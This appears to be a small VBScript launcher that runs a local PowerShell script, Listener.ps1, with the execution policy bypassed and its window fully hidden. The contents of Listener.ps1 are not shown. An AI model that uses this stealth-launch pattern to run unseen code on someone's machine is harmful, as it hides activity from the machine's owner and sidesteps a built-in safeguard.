Set objFSO = CreateObject("Scripting.FileSystemObject")
strPath = objFSO.GetParentFolderName(WScript.ScriptFullName)
Set objShell = CreateObject("WScript.Shell")
' Run the Listener.ps1 completely hidden
objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & strPath & "\Listener.ps1""", 0, False
